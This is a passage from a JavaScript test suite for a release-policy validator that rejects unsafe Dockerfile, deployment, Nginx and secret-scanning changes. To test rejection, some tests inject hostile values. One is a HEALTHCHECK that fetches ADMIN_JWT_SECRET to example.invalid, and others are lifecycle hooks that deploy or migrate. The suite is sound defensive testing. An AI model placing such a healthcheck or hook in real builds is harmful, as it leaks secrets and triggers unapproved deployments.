      dockerfilePath,
      (await readFile(dockerfilePath, 'utf8')).replace(alphaCopy, `${alphaCopy}\n${betaCopy}`),
      'utf8',
    );
    assert.deepEqual(await validateReleasePolicy(root), []);

    await writeRelative(root, 'node_modules/beta/package.json', `${JSON.stringify({
      name: 'beta',
      version: '0.0.0',
      type: 'module',
      exports: './index.js',
      dependencies: { gamma: '0.0.0' },
    }, null, 2)}\n`);
    await writeRelative(root, 'node_modules/gamma/package.json', `${JSON.stringify({
      name: 'gamma',
      version: '0.0.0',
      type: 'module',
      exports: './index.js',
    }, null, 2)}\n`);
    await writeRelative(root, 'node_modules/gamma/index.js', 'export const gamma = true;\n');
    assertRejected(
      await validateReleasePolicy(root),
      /runtime package dependency is absent from the final-image dependency tree: beta -> gamma/u,
    );
  });
});

test('requires an installed optional runtime dependency in the final image', async () => {
  await withFixture(async (root) => {
    const packagePath = path.join(root, 'package.json');
    const packageJson = JSON.parse(await readFile(packagePath, 'utf8'));
    packageJson.dependencies.alpha = '0.0.0';
    await writeFile(packagePath, `${JSON.stringify(packageJson, null, 2)}\n`, 'utf8');
    await writeRelative(root, 'node_modules/alpha/package.json', `${JSON.stringify({
      name: 'alpha',
      version: '0.0.0',
      type: 'module',
      exports: './index.js',
      optionalDependencies: { beta: '0.0.0' },
    }, null, 2)}\n`);
    await writeRelative(root, 'node_modules/alpha/index.js', "import 'beta';\n");
    await writeRelative(root, 'node_modules/beta/package.json', `${JSON.stringify({
      name: 'beta',
      version: '0.0.0',
      type: 'module',
      exports: './index.js',
    }, null, 2)}\n`);
    await writeRelative(root, 'node_modules/beta/index.js', 'export const beta = true;\n');
    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
    const credentialSource = await readFile(credentialPath, 'utf8');
    await writeFile(
      credentialPath,
      `${credentialSource.trimEnd()}\nimport 'alpha';\n`,
      'utf8',
    );
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(
        ZOD_RUNTIME_COPY,
        `${ZOD_RUNTIME_COPY}\nCOPY --from=builder /app/node_modules/alpha ./node_modules/alpha`,
      ),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /runtime package dependency is absent from the final-image dependency tree: alpha -> beta/u,
    );
  });
});

test('rejects a symlinked package dependency slot outside its parent COPY', async () => {
  await withFixture(async (root) => {
    const packagePath = path.join(root, 'package.json');
    const packageJson = JSON.parse(await readFile(packagePath, 'utf8'));
    packageJson.dependencies.alpha = '0.0.0';
    await writeFile(packagePath, `${JSON.stringify(packageJson, null, 2)}\n`, 'utf8');
    await writeRelative(root, 'node_modules/alpha/package.json', `${JSON.stringify({
      name: 'alpha',
      version: '0.0.0',
      type: 'module',
      exports: './index.js',
      optionalDependencies: { beta: '0.0.0' },
    }, null, 2)}\n`);
    await writeRelative(root, 'node_modules/alpha/index.js', "import 'beta';\n");
    await writeRelative(root, 'node_modules/beta/package.json', `${JSON.stringify({
      name: 'beta',
      version: '0.0.0',
      type: 'module',
      exports: './index.js',
    }, null, 2)}\n`);
    await writeRelative(root, 'node_modules/beta/index.js', 'export const beta = true;\n');
    await mkdir(path.join(root, 'node_modules/alpha/node_modules'), { recursive: true });
    await symlink(
      '../../beta',
      path.join(root, 'node_modules/alpha/node_modules/beta'),
    );
    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
    const credentialSource = await readFile(credentialPath, 'utf8');
    await writeFile(
      credentialPath,
      `${credentialSource.trimEnd()}\nimport 'alpha';\n`,
      'utf8',
    );
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(
        ZOD_RUNTIME_COPY,
        `${ZOD_RUNTIME_COPY}\nCOPY --from=builder /app/node_modules/alpha ./node_modules/alpha`,
      ),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /runtime package metadata is invalid: alpha/u,
    );
  });
});

test('rejects a symlinked directly imported package root', async () => {
  await withFixture(async (root) => {
    await rm(path.join(root, 'node_modules/zod'), { force: true, recursive: true });
    await writeRelative(root, 'node_modules/zod-real/package.json', `${JSON.stringify({
      name: 'zod',
      version: '0.0.0',
      type: 'module',
      exports: {
        '.': './index.js',
        './a-valid': './index.js',
      },
    }, null, 2)}\n`);
    await writeRelative(root, 'node_modules/zod-real/index.js', 'export const z = {};\n');
    await symlink('zod-real', path.join(root, 'node_modules/zod'));
    assertRejected(
      await validateReleasePolicy(root),
      /runtime package metadata is invalid: zod/u,
    );
  });
});

test('accepts a nested runtime dependency covered by its parent package copy', async () => {
  await withFixture(async (root) => {
    const packagePath = path.join(root, 'package.json');
    const packageJson = JSON.parse(await readFile(packagePath, 'utf8'));
    packageJson.dependencies.alpha = '0.0.0';
    await writeFile(packagePath, `${JSON.stringify(packageJson, null, 2)}\n`, 'utf8');
    await writeRelative(root, 'node_modules/alpha/package.json', `${JSON.stringify({
      name: 'alpha',
      version: '0.0.0',
      type: 'module',
      exports: './index.js',
      dependencies: { beta: '0.0.0' },
    }, null, 2)}\n`);
    await writeRelative(root, 'node_modules/alpha/index.js', "import 'beta';\n");
    await writeRelative(root, 'node_modules/alpha/node_modules/beta/package.json',
      `${JSON.stringify({
        name: 'beta',
        version: '0.0.0',
        type: 'module',
        exports: './index.js',
      }, null, 2)}\n`);
    await writeRelative(
      root,
      'node_modules/alpha/node_modules/beta/index.js',
      'export const beta = true;\n',
    );
    const credentialPath = path.join(root, 'src/lib/runtime-credentials.js');
    const credentialSource = await readFile(credentialPath, 'utf8');
    await writeFile(
      credentialPath,
      `${credentialSource.trimEnd()}\nimport 'alpha';\n`,
      'utf8',
    );
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(
        ZOD_RUNTIME_COPY,
        `${ZOD_RUNTIME_COPY}\nCOPY --from=builder /app/node_modules/alpha ./node_modules/alpha`,
      ),
      'utf8',
    );
    assert.deepEqual(await validateReleasePolicy(root), []);
  });
});

test('rejects a package copied to another package final-image location', async () => {
  await withFixture(async (root) => {
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(ZOD_RUNTIME_COPY, [
        ZOD_RUNTIME_COPY,
        'COPY --from=builder /app/node_modules/zod ./node_modules/not-zod',
      ].join('\n')),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /runtime package must preserve its final-image location: zod/u,
    );
  });
});

test('rejects a foreign copy that can collide with a runtime package tree', async () => {
  await withFixture(async (root) => {
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(ZOD_RUNTIME_COPY, [
        ZOD_RUNTIME_COPY,
        'COPY --from=other /foreign/module ./node_modules/zod/foreign',
      ].join('\n')),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /runtime package final-image tree has a foreign COPY collision: zod/u,
    );
  });
});

test('rejects a foreign copy that can overwrite a packaged runtime module', async () => {
  await withFixture(async (root) => {
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(RUNTIME_CREDENTIAL_COPY, [
        RUNTIME_CREDENTIAL_COPY,
        'COPY --from=other /foreign/module ./src/lib/runtime-credentials.js',
      ].join('\n')),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /runtime module final-image path has a foreign COPY collision: src\/lib\/runtime-credentials\.js/u,
    );
  });
});

test('rejects a foreign copy that can overwrite the standalone runtime target', async () => {
  await withFixture(async (root) => {
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(
        STANDALONE_RUNTIME_COPY,
        `${STANDALONE_RUNTIME_COPY}\nCOPY --from=other /foreign/server.js ./server.js`,
      ),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /standalone runtime target has a foreign COPY collision/u,
    );
  });
});

test('rejects an unmodeled copy into the repository source tree', async () => {
  await withFixture(async (root) => {
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(
        RUNTIME_CREDENTIAL_COPY,
        `${RUNTIME_CREDENTIAL_COPY}\nCOPY --from=other /foreign/unrelated.js ./src/lib/unrelated.js`,
      ),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /docker\/Dockerfile\.security: unmodeled repository-source destination COPY/u,
    );
  });
});

test('rejects broad repository-source copies as runtime-closure substitutes', async () => {
  for (const [options, source, destination] of [
    ['--from=builder ', '/app', './'],
    ['--from=builder ', '/app/src', './src'],
    ['--from=builder ', '/app/src/lib', './src/lib'],
    ['--from=other ', '/app/src', './src'],
    ['', '.', './'],
    ['', 'src', './src'],
    ['', 'src/lib', './src/lib'],
  ]) {
    await withFixture(async (root) => {
      const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
      const dockerfile = await readFile(dockerfilePath, 'utf8');
      await writeFile(
        dockerfilePath,
        dockerfile.replace(
          RUNTIME_CREDENTIAL_COPY,
          `COPY ${options}${source} ${destination}`,
        ),
        'utf8',
      );
      assertRejected(
        await validateReleasePolicy(root),
        /broad repository-source COPY is forbidden/u,
      );
    });
  }
});

test('rejects final-stage ADD instructions as unmodeled runtime inputs', async () => {
  for (const instruction of [
    'ADD . .',
    'ADD src ./src',
  ]) {
    await withFixture(async (root) => {
      const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
      const dockerfile = await readFile(dockerfilePath, 'utf8');
      await writeFile(
        dockerfilePath,
        dockerfile.replace(
          RUNTIME_CREDENTIAL_COPY,
          `${RUNTIME_CREDENTIAL_COPY}\n${instruction}`,
        ),
        'utf8',
      );
      assertRejected(
        await validateReleasePolicy(root),
        /docker\/Dockerfile\.security final ADD instructions are forbidden/u,
      );
    });
  }
});

test('rejects an unmodeled RUN after runtime files were copied', async () => {
  await withFixture(async (root) => {
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(
        RUNTIME_CREDENTIAL_COPY,
        `${RUNTIME_CREDENTIAL_COPY}\nRUN rm /app/src/lib/runtime-credentials.js`,
      ),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /docker\/Dockerfile\.security: unmodeled RUN after runtime files were copied/u,
    );
  });
});

test('rejects an unmodeled final-stage RUN before runtime files are copied', async () => {
  await withFixture(async (root) => {
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(
        STANDALONE_RUNTIME_COPY,
        [
          'RUN --mount=type=bind,from=builder,source=/app/src/lib,target=/tmp/lib cp -R /tmp/lib /app/src/lib',
          STANDALONE_RUNTIME_COPY,
        ].join('\n'),
      ),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /docker\/Dockerfile\.security: unmodeled final-stage RUN instruction/u,
    );
  });
});

test('requires the exact final-stage hardening RUN after every COPY', async () => {
  for (const mutate of [
    (dockerfile) => dockerfile.replace(`${RUNTIME_HARDENING_RUN}\n`, ''),
    (dockerfile) => dockerfile.replace(
      `${ZOD_RUNTIME_COPY}\n${RUNTIME_HARDENING_RUN}`,
      `${RUNTIME_HARDENING_RUN}\n${ZOD_RUNTIME_COPY}`,
    ),
    (dockerfile) => dockerfile.replace(
      RUNTIME_HARDENING_RUN,
      `${RUNTIME_HARDENING_RUN}\nCOPY --from=other /foreign/late.txt ./late.txt`,
    ),
  ]) {
    await withFixture(async (root) => {
      const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
      const dockerfile = await readFile(dockerfilePath, 'utf8');
      await writeFile(dockerfilePath, mutate(dockerfile), 'utf8');
      assertRejected(
        await validateReleasePolicy(root),
        /docker\/Dockerfile\.security: final-stage runtime RUN contract is invalid/u,
      );
    });
  }
});

test('requires the exact non-root runtime user and startup entrypoint', async () => {
  for (const [from, to, expected] of [
    [RUNTIME_USER, 'USER root', /final runtime USER contract is invalid/u],
    [
      RUNTIME_ENTRYPOINT,
      'ENTRYPOINT ["node", "server.js"]',
      /final runtime ENTRYPOINT contract is invalid/u,
    ],
  ]) {
    await withFixture(async (root) => {
      const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
      const dockerfile = await readFile(dockerfilePath, 'utf8');
      await writeFile(dockerfilePath, dockerfile.replace(from, to), 'utf8');
      assertRejected(await validateReleasePolicy(root), expected);
    });
  }
});

test('requires the exact single final-stage runtime environment', async () => {
  for (const mutate of [
    (dockerfile) => dockerfile.replace(`${RUNTIME_ENV}\n`, ''),
    (dockerfile) => dockerfile.replace(
      RUNTIME_ENV,
      RUNTIME_ENV.replace('NODE_ENV=production', 'NODE_ENV=development'),
    ),
    (dockerfile) => dockerfile.replace(
      RUNTIME_USER,
      'ENV NODE_OPTIONS=--import=/app/server.js\nUSER 1001:1001',
    ),
  ]) {
    await withFixture(async (root) => {
      const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
      const dockerfile = await readFile(dockerfilePath, 'utf8');
      await writeFile(dockerfilePath, mutate(dockerfile), 'utf8');
      assertRejected(
        await validateReleasePolicy(root),
        /final runtime ENV contract is invalid/u,
      );
    });
  }
});

test('requires the exact single safe runtime healthcheck', async () => {
  for (const mutate of [
    (dockerfile) => dockerfile.replace(`${RUNTIME_HEALTHCHECK}\n`, ''),
    (dockerfile) => dockerfile.replace(RUNTIME_HEALTHCHECK, 'HEALTHCHECK NONE'),
    (dockerfile) => dockerfile.replace(
      RUNTIME_HEALTHCHECK,
      'HEALTHCHECK CMD node -e "fetch(\'https://example.invalid/?s=\'+process.env.ADMIN_JWT_SECRET)"',
    ),
    (dockerfile) => dockerfile.replace(
      RUNTIME_HEALTHCHECK,
      `${RUNTIME_HEALTHCHECK}\n${RUNTIME_HEALTHCHECK}`,
    ),
  ]) {
    await withFixture(async (root) => {
      const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
      const dockerfile = await readFile(dockerfilePath, 'utf8');
      await writeFile(dockerfilePath, mutate(dockerfile), 'utf8');
      assertRejected(
        await validateReleasePolicy(root),
        /final runtime HEALTHCHECK contract is invalid/u,
      );
    });
  }
});

test('rejects unmodeled final-image copies and shell overrides', async () => {
  for (const instruction of [
    'COPY --from=builder /app/unrelated.txt ./unrelated.txt',
    'SHELL ["/bin/sh", "-c"]',
  ]) {
    await withFixture(async (root) => {
      const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
      const dockerfile = await readFile(dockerfilePath, 'utf8');
      await writeFile(
        dockerfilePath,
        dockerfile.replace(RUNTIME_HARDENING_RUN, `${instruction}\n${RUNTIME_HARDENING_RUN}`),
        'utf8',
      );
      assertRejected(
        await validateReleasePolicy(root),
        /unmodeled final-image COPY|final-stage SHELL instructions are forbidden/u,
      );
    });
  }
});

test('rejects unreferenced manual module and package copies', async () => {
  await withFixture(async (root) => {
    await writeRelative(root, 'src/lib/unrelated.js', 'export const unrelated = true;\n');
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(
        RUNTIME_CREDENTIAL_COPY,
        [
          RUNTIME_CREDENTIAL_COPY,
          'COPY --from=builder /app/src/lib/unrelated.js ./src/lib/unrelated.js',
        ].join('\n'),
      ),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /unreferenced manually copied runtime module: src\/lib\/unrelated\.js/u,
    );
  });

  await withFixture(async (root) => {
    await writeRelative(root, 'node_modules/unrelated/package.json', `${JSON.stringify({
      name: 'unrelated',
      version: '0.0.0',
      type: 'module',
      exports: './index.js',
    }, null, 2)}\n`);
    await writeRelative(
      root,
      'node_modules/unrelated/index.js',
      'export const unrelated = true;\n',
    );
    const dockerfilePath = path.join(root, 'docker/Dockerfile.security');
    const dockerfile = await readFile(dockerfilePath, 'utf8');
    await writeFile(
      dockerfilePath,
      dockerfile.replace(
        ZOD_RUNTIME_COPY,
        `${ZOD_RUNTIME_COPY}\nCOPY --from=builder /app/node_modules/unrelated ./node_modules/unrelated`,
      ),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /unreferenced runtime package copy: unrelated/u,
    );
  });
});

test('rejects reintroducing an obsolete runtime credential requirement', async () => {
  await withFixture(async (root) => {
    const examplePath = path.join(root, '.env.example');
    const current = await readFile(examplePath, 'utf8');
    await writeFile(
      examplePath,
      `${current}SESSION_SECRET=\n`,
      'utf8',
    );
    assertRejected(await validateReleasePolicy(root), /obsolete runtime credential SESSION_SECRET/u);
  });
});

test('rejects bypassing the centralized guest signing credential reader', async () => {
  await withFixture(async (root) => {
    await writeFile(
      path.join(root, 'src/lib/guestSession.ts'),
      "const secret = process.env.GUEST_JWT_SECRET || 'dev-guest-secret-change-me';\n",
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /centralized runtime credential reader|fixed development guest signing credentials/u,
    );
  });
});

test('rejects removing the standalone credential startup matrix', async () => {
  await withFixture(async (root) => {
    await writeFile(
      path.join(root, 'scripts/test-runtime-credential-contract.mjs'),
      'SYNTHETIC_PRODUCTION_ENVIRONMENT\n',
      'utf8',
    );
    assertRejected(await validateReleasePolicy(root), /standalone credential contract test lacks/u);
  });
});

test('rejects expansion of the six-finding IR-01 baseline', async () => {
  await withFixture(async (root) => {
    const baselinePath = path.join(
      root,
      'config/secret-scanning/historical-incident-baseline.json',
    );
    const baseline = JSON.parse(await readFile(baselinePath, 'utf8'));
    baseline.findings.push({
      classification: 'unreviewed',
      fingerprint: 'new:historical:finding',
    });
    await writeFile(baselinePath, `${JSON.stringify(baseline, null, 2)}\n`, 'utf8');
    assertRejected(await validateReleasePolicy(root), /exactly the six reviewed/u);
  });
});

test('rejects expansion of the current secret-fixture allowlist', async () => {
  await withFixture(async (root) => {
    const allowlistPath = path.join(
      root,
      'config/secret-scanning/current-fixture-allowlist.json',
    );
    const allowlist = JSON.parse(await readFile(allowlistPath, 'utf8'));
    allowlist.findings.push({
      classification: 'synthetic-test-fixture',
      path: 'tests/unreviewed.ts',
      rule: 'generic-api-key',
      line: 1,
      column: 1,
    });
    await writeFile(allowlistPath, `${JSON.stringify(allowlist, null, 2)}\n`, 'utf8');
    assertRejected(await validateReleasePolicy(root), /reviewed exact locations/u);
  });
});

test('rejects a global Gitleaks ignore file', async () => {
  await withFixture(async (root) => {
    await writeRelative(root, '.gitleaksignore', 'unreviewed-global-suppression\n');
    assertRejected(await validateReleasePolicy(root), /global .gitleaksignore suppression/u);
  });
});

test('rejects retaining raw scanner reports beyond in-process classification', async () => {
  await withFixture(async (root) => {
    const scannerPath = path.join(root, 'scripts/check-secrets.mjs');
    const scanner = await readFile(scannerPath, 'utf8');
    await writeFile(
      scannerPath,
      scanner.replace('await rm(reportPath, { force: true });', ''),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /await rm\(reportPath, \{ force: true \}\)/u,
    );
  });
});

test('rejects removing generated-artifact semantic classification', async () => {
  await withFixture(async (root) => {
    const scannerPath = path.join(root, 'scripts/check-secrets.mjs');
    const scanner = await readFile(scannerPath, 'utf8');
    await writeFile(
      scannerPath,
      scanner.replace('classifyGeneratedArtifactFinding();', ''),
      'utf8',
    );
    assertRejected(
      await validateReleasePolicy(root),
      /classifyGeneratedArtifactFinding/u,
    );
  });
});

test('rejects claim capability parsing from a URL', async () => {
  await withFixture(async (root) => {
    const guestPath = path.join(root, 'src/app/[locale]/guest/UnifiedGuestClient.tsx');
    const source = await readFile(guestPath, 'utf8');
    await writeFile(guestPath, `${source}\nconst leaked = search.get('claim');\n`, 'utf8');
    assertRejected(await validateReleasePolicy(root), /must not be created or consumed through URLs/u);
  });
});

test('rejects claim consumption directly from a JSON token field', async () => {
  await withFixture(async (root) => {
    await writeRelative(root, 'src/app/api/portal/claims/route.ts', [
      'readPortalClaimExchange();',
      'clearPresentedPortalClaimExchange();',
      'const input = { claimToken: "forbidden-direct-transport" };',
      'void input;',
      '',
    ].join('\n'));
    assertRejected(
      await validateReleasePolicy(root),
      /must use and clear only the server-controlled exchange cookie/u,
    );
  });
});

test('rejects any GitHub Actions workflow', async () => {
  await withFixture(async (root) => {
    await writeRelative(root, '.github/workflows/ci.yml', 'on: [push]\njobs: {}\n');
    assertRejected(await validateReleasePolicy(root), /active GitHub Actions workflows/u);
  });
});

test('rejects a GitHub Pages deployment workflow', async () => {
  await withFixture(async (root) => {
    await writeRelative(
      root,
      '.github/workflows/pages.yml',
      'on: [push]\njobs:\n  deploy:\n    steps:\n      - uses: actions/deploy-pages@0123456789012345678901234567890123456789\n',
    );
    assertRejected(await validateReleasePolicy(root), /workflows\/pages\.yml/u);
  });
});

test('rejects pull_request_target even outside the workflow directory', async () => {
  await withFixture(async (root) => {
    await writeRelative(root, '.github/policy.yml', 'on: pull_request_target\n');
    assertRejected(await validateReleasePolicy(root), /pull_request_target/u);
  });
});

test('rejects a Vercel deployment command', async () => {
  await withFixture(async (root) => {
    await mutatePackage(root, (packageJson) => {
      packageJson.scripts.publishPreview = 'vercel deploy --prod';
    });
    assertRejected(await validateReleasePolicy(root), /Vercel deployment command/u);
  });
});

test('rejects a Wrangler deployment command', async () => {
  await withFixture(async (root) => {
    await mutatePackage(root, (packageJson) => {
      packageJson.scripts.publishWorker = 'wrangler deploy';
    });
    assertRejected(await validateReleasePolicy(root), /Wrangler deployment command/u);
  });
});

test('rejects a Cloudflare Pages deployment command', async () => {
  await withFixture(async (root) => {
    await mutatePackage(root, (packageJson) => {
      packageJson.scripts.publishPages = 'wrangler pages deploy ./out';
    });
    assertRejected(await validateReleasePolicy(root), /Wrangler Pages deployment command/u);
  });
});

test('rejects a GitHub Pages deployment path', async () => {
  await withFixture(async (root) => {
    await mutatePackage(root, (packageJson) => {
      packageJson.scripts.publishPages = 'gh-pages -d out';
    });
    assertRejected(await validateReleasePolicy(root), /GitHub Pages deployment command/u);
  });
});

test('rejects a tracked-style GitHub Pages CNAME artifact', async () => {
  await withFixture(async (root) => {
    await writeRelative(root, 'CNAME', 'www.example.invalid\n');
    assertRejected(await validateReleasePolicy(root), /deployment artifact CNAME/u);
  });
});

test('rejects a tag-only PostgreSQL image', async () => {
  await withFixture(async (root) => {
    await writeRelative(
      root,
      'docker/docker-compose.prod.yml',
      'services:\n  db:\n    image: postgres:16-alpine\n',
    );
    assertRejected(await validateReleasePolicy(root), /digest-pinned PostgreSQL image/u);
  });
});

test('rejects missing private attestation overwrite', async () => {
  await withFixture(async (root) => {
    const configPath = path.join(root, 'deploy/nginx/nginx.conf.template');
    const config = await readFile(configPath, 'utf8');
    await writeFile(configPath, config.replace(
      'proxy_set_header X-Origin-Proxy-Attestation $origin_proxy_attestation;\n',
      '',
    ));
    assertRejected(await validateReleasePolicy(root), /X-Origin-Proxy-Attestation/u);
  });
});

test('rejects wildcard Nginx proxy trust', async () => {
  await withFixture(async (root) => {
    await writeRelative(root, 'deploy/nginx/includes/cloudflare-realip.conf', 'set_real_ip_from 0.0.0.0/0;\n');
    assertRejected(await validateReleasePolicy(root), /wildcard trusted proxy/u);
  });
});

test('rejects canonical X-Forwarded-For append behavior', async () => {
  await withFixture(async (root) => {
    const configPath = path.join(root, 'deploy/nginx/nginx.conf.template');
    const config = await readFile(configPath, 'utf8');
    await writeFile(configPath, `${config}proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n`);
    assertRejected(await validateReleasePolicy(root), /proxy_add_x_forwarded_for/u);
  });
});

test('rejects a Cloudflare manifest without IPv6', async () => {
  await withFixture(async (root) => {
    await writeRelative(root, 'deploy/nginx/cloudflare-ips.json', JSON.stringify({
      version: 1,
      ipv4: ['203.0.113.0/24'],
      ipv6: [],
    }));
    assertRejected(await validateReleasePolicy(root), /must contain IPv6/u);
  });
});

test('rejects public publication of the application port', async () => {
  await withFixture(async (root) => {
    await writeRelative(root, 'docker/docker-compose.prod.yml', [
      'services:',
      '  db:',
      `    image: ${APPROVED_IMAGE}`,
      '  app:',
      '    ports:',
      '      - "3000:3000"',
      '',
    ].join('\n'));
    assertRejected(await validateReleasePolicy(root), /application port must not be publicly published/u);
  });
});

test('rejects certificate or private-key material under deploy/nginx', async () => {
  await withFixture(async (root) => {
    await writeRelative(root, 'deploy/nginx/origin.key', 'synthetic forbidden key material\n');
    assertRejected(await validateReleasePolicy(root), /secret or certificate material is forbidden/u);
  });
});

test('rejects application identity reads from public forwarding headers', async () => {
  await withFixture(async (root) => {
    await writeRelative(root, 'src/lib/net/getClientIp.ts', [
      "import { timingSafeEqual } from 'node:crypto';",
      "const ip = 'x-origin-verified-client-ip';",
      "const attestation = 'x-origin-proxy-attestation';",
      "request.headers.get('x-forwarded-for');",
      'void timingSafeEqual; void ip; void attestation;',
      '',
    ].join('\n'));
    assertRejected(await validateReleasePolicy(root), /must not read public forwarding headers/u);
  });
});

test('rejects removal of the Nginx syntax integration gate', async () => {
  await withFixture(async (root) => {
    await mutatePackage(root, (packageJson) => {
      packageJson.scripts['test:nginx-ingress'] = 'node --version';
    });
    assertRejected(await validateReleasePolicy(root), /package script test:nginx-ingress must be exactly/u);
  });
});

test('rejects reintroduction of mandatory Upstash configuration', async () => {
  await withFixture(async (root) => {
    await writeRelative(root, 'src/lib/external-limiter.ts', 'const value = process.env.UPSTASH_REDIS_REST_URL;\n');
    assertRejected(await validateReleasePolicy(root), /mandatory external rate-limiter configuration/u);
  });
});

test('rejects removal of Nginx rate-limit enforcement semantics', async () => {
  await withFixture(async (root) => {
    const configPath = path.join(root, 'deploy/nginx/nginx.conf.template');
    const config = await readFile(configPath, 'utf8');
    await writeFile(configPath, config.replace('limit_req_status 429;\n', ''));
    assertRejected(await validateReleasePolicy(root), /limit_req_status 429/u);
  });
});

test('rejects a non-atomic sensitive PostgreSQL limiter', async () => {
  await withFixture(async (root) => {
    await writeRelative(root, 'src/lib/sensitiveRateLimit.ts', [
      'const ApiErrorCode = { SERVICE_UNAVAILABLE: 503 };',
      'void ApiErrorCode.SERVICE_UNAVAILABLE;',
      '',
    ].join('\n'));
    assertRejected(await validateReleasePolicy(root), /atomic and fail closed/u);
  });
});

test('rejects an external limiter readiness dependency', async () => {
  await withFixture(async (root) => {
    await writeRelative(root, 'src/app/api/health/ready/route.ts', [
      'async function databaseReady() { return true; }',
      'async function checkReadiness() { await pingUpstash(); return databaseReady(); }',
      '',
    ].join('\n'));
    assertRejected(await validateReleasePolicy(root), /external rate-limiting service/u);
  });
});

test('rejects a production-default database mutation', async () => {
  await withFixture(async (root) => {
    await mutatePackage(root, (packageJson) => {
      packageJson.scripts.migrateProduction =
        'bash scripts/system-orchestrator.sh migrate --profile production';
    });
    assertRejected(await validateReleasePolicy(root), /must not select production by default/u);
  });
});

test('rejects simultaneous staging and production credential consumption', async () => {
  await withFixture(async (root) => {
    await mutatePackage(root, (packageJson) => {
      packageJson.scripts.migrateBoth =
        'DATABASE_URL="$STAGING_DATABASE_URL" tool && DATABASE_URL="$PROD_DATABASE_URL" tool';
    });
    assertRejected(await validateReleasePolicy(root), /credentials together/u);
  });
});

test('rejects a deployment command inserted into verify:release', async () => {
  await withFixture(async (root) => {
    const gates = RELEASE_GATES.map((gate) => ({ ...gate, args: [...gate.args] }));
    gates[0] = {
      ...gates[0],
      command: 'vercel',
      args: ['deploy', '--prod'],
    };
    assertRejected(
      await validateReleasePolicy(root, { gates }),
      /forbidden inside verify:release|restricted secret-sources profile/u,
    );
  });
});

test('rejects a persistent migration inserted into verify:release', async () => {
  await withFixture(async (root) => {
    const gates = RELEASE_GATES.map((gate) => ({ ...gate, args: [...gate.args] }));
    gates[0] = {
      ...gates[0],
      command: 'prisma',
      args: ['migrate', 'deploy'],
    };
    assertRejected(
      await validateReleasePolicy(root, { gates }),
      /persistent migration commands|restricted secret-sources profile/u,
    );
  });
});

test('rejects redirecting a mandatory gate script to a no-op', async () => {
  await withFixture(async (root) => {
    await mutatePackage(root, (packageJson) => {
      packageJson.scripts['test:integration'] = 'node --version';
    });
    assertRejected(await validateReleasePolicy(root), /package script test:integration must be exactly/u);
  });
});

test('rejects a pre-hook on the canonical release command', async () => {
  await withFixture(async (root) => {
    await mutatePackage(root, (packageJson) => {
      packageJson.scripts['preverify:release'] = 'prisma migrate deploy';
    });
    assertRejected(await validateReleasePolicy(root), /lifecycle hook preverify:release is forbidden/u);
  });
});

test('rejects a post-hook on a mandatory gate script', async () => {
  await withFixture(async (root) => {
    await mutatePackage(root, (packageJson) => {
      packageJson.scripts['posttest:integration'] = 'vercel deploy --prod';
    });
    assertRejected(await validateReleasePolicy(root), /lifecycle hook posttest:integration is forbidden/u);
  });
});

test('rejects hiding a persistent migration behind a mandatory gate script', async () => {
  await withFixture(async (root) => {
    await mutatePackage(root, (packageJson) => {
      packageJson.scripts['test:integration'] = 'prisma migrate deploy';
    });
    assertRejected(await validateReleasePolicy(root), /package script test:integration must be exactly/u);
  });
});

test('release orchestrator executes every gate in order with restricted environments', async () => {
  const inheritedName = 'RELEASE_POLICY_TEST_SECRET';
  const previous = process.env[inheritedName];
  process.env[inheritedName] = 'must-not-reach-child';
  try {
    const gates = [
